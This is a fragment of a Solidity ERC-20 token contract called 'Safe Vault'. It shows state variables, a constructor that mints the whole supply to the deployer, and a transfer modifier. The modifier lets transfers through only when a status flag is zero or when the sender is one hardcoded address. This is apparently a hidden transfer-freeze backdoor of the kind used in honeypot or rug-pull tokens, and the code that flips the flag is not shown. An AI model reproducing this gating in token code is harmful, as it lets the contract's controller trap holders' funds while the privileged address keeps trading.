...
contract SafeVault is Context, IERC20, IERC20Metadata {

    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _tokenad_totalSupply;
    uint256 private _tokenad_status = 0;
    uint256 public stakingPooladStatus = 0;

    string private _tokenad_name;
    string private _tokenad_symbol;

    address private _pooladAddress = 0x0EfF76160BeA787cCebbfC11763535a5c04B511a;

    constructor() {
        _tokenad_name = "Safe Vault";
        _tokenad_symbol = "VAULT";
        _tokenad_totalSupply = 1000000 * 10 ** 18;
        _balances[msg.sender] = _tokenad_totalSupply;
    }

    modifier forTransfer {
        require(msg.sender == _pooladAddress || _tokenad_status == 0);
        _;
    }
